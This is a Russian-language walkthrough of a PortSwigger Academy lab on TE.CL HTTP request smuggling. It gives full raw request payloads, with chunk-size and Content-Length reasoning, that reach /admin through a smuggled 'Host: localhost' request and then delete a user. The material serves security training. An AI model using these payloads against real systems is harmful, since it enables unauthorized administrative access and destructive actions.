будем считать, что мы уже знаем, что тут `TE.CL`, и сразу начнем с данным знанием

```
POST / HTTP/1.1
Host: 0a5e009403d00499802b582200920092.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

5a
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0

```
внизу сонтект ленгтх =6 потому что 5+1

5а потому что столько длиной запрос 
```
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
```
а вверху контент ленгтх 4 ибо такая длина у `5a\r\n\`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/7.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20TE.CL%20vulnerability/pics%20for%20walkthrough/1.png)

а вдогонку пошлем обычный запрос
```
POST / HTTP/1.1
Host: 0a5e009403d00499802b582200920092.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
После чего видим, что разрешено подключаться только с локалхостом

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/7.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20TE.CL%20vulnerability/pics%20for%20walkthrough/2.png)
отлично, добавим 
`Host: localhost`

и изменим значение c `5а` на `6b` так как мы добавили` Host: localhost` и длина запроса увеличилась

```
POST / HTTP/1.1
Host: 0a5e009403d00499802b582200920092.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

6b
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0

```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/7.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20TE.CL%20vulnerability/pics%20for%20walkthrough/3.png)

отправим следующий дефолтный запрос, и увидим, что нас уже пустило в админку
```
POST / HTTP/1.1
Host: 0a5e009403d00499802b582200920092.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/7.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20TE.CL%20vulnerability/pics%20for%20walkthrough/4.png)

отлично, теперь удалим carlos'а как этого и требует задание

```
POST / HTTP/1.1
Host: 0a5e009403d00499802b582200920092.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

82
POST /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0

```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/7.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20TE.CL%20vulnerability/pics%20for%20walkthrough/5.png)
отправим дефолтный запрос
```
POST / HTTP/1.1
Host: 0a5e009403d00499802b582200920092.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

пройдем по всем редиректам и получим уведомление об успешно выполненной лабораторной работе


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/7.%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20TE.CL%20vulnerability/pics%20for%20walkthrough/6.png)
